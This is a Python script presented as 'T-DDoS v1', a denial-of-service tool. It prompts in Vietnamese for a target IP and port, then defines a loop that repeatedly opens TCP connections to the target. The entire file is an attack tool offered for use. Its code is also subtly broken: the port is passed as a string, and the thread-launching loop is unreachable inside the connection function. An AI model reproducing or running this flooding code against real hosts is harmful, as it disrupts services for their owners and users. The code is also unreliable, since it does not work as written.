#!/usr/bin/python3
# This code write by (T-DDoS)
# T-DDoS v1
import os
try:
   from colorama import Fore,init
   init()
except ImportError:
    os.system("pip3 install colorama")
import time
import sys
import socket
import threading
import platform
system = platform.uname()[0]
def title():
    if system == 'Linux':
      os.system("printf '\033]2; T-DDoSv1\a'")
    elif system == 'Windows':
        os.system("title T-DDoSv1")
    else:
         print("\nPlease, Run This programm on Linux, Windows or MacOS!\n")
         sys.exit()         
def cls():
    if system == 'Windows':
      os.system("cls")
    elif system == 'Linux':
        os.system("clear")
    else:
         print("\Vui lòng chạy chương trình này trên Linux, Windows hoặc MacOS!\n")
         sys.exit()
class color:
    red = '\033[91m'
    green = '\033[92m'
    End = '\033[0m'
    blue = '\033[33m'
def menu():
    title()
    cls()
    print(color.green + """
╔╦╗ ╔╦╗╔╦╗┌─┐╔═╗
 ║───║║ ║║│ │╚═╗
 ╩  ═╩╝═╩╝└─┘╚═╝\n""" + color.blue + """
     ----[    Tool By (T-DDoS)   ]---
     -------[ youtube :""" + color.blue + """ https://youtube.com/channel/UCsAYsNd0GKGfkkzz7ARf9eg ]-----------""" + color.End)
    web = input("\nNhập ip: ")
    time.sleep(1)
    port = input("\nNhập Port: ")
    victim_ip = socket.gethostbyname(web)
    ##################################################
    UDP_PORT = port
    time.sleep(1)
    os.system("clear")
    print(color.red + "=============================================================================\n" + color.End)
    print("Target IP:", victim_ip)
    time.sleep(1)
    print("\nTarget port:", UDP_PORT)
    print(color.red + "=============================================================================\n" + color.End)
    time.sleep(3)
    def run(k):
        while True:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((web,port))
             print(f"Packet send To {victim_ip}")
        for i in range(10):
           c = threading.Thread(target=run, args=[i])
           c.start()
if __name__ == '__main__':
    try:
        try:
           menu()
        except EOFError:
            print("\nCtrl + D")
            print("\nExiting...")
            sys.exit()
    except KeyboardInterrupt:
        print("\nCtrl + C")
        print("\nExiting...")
        sys.exit()
# Thanks For using :)
